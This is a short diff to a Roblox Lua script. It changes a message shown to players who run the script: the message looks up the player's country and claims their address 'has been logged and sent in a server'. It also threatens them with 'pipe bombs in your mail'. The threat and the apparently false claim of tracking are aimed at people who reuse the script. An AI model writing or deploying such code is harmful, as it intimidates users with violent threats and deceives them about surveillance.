@@ -212,11 +212,10 @@ local player = game.Players.LocalPlayer
 local playerCountry = getPlayerCountry(player)
 
 
-
-
-print([[
+local asd = Instance.new("Message", workspace)
+asd.Text = [[
 Your address has been logged and sent in a server
-Bro tried to steal my script
+Bro tried to use my script without my knoledge
 
 Good luck having pipe bombs in your mail]].. playerCountry ..[[ user :D!
 
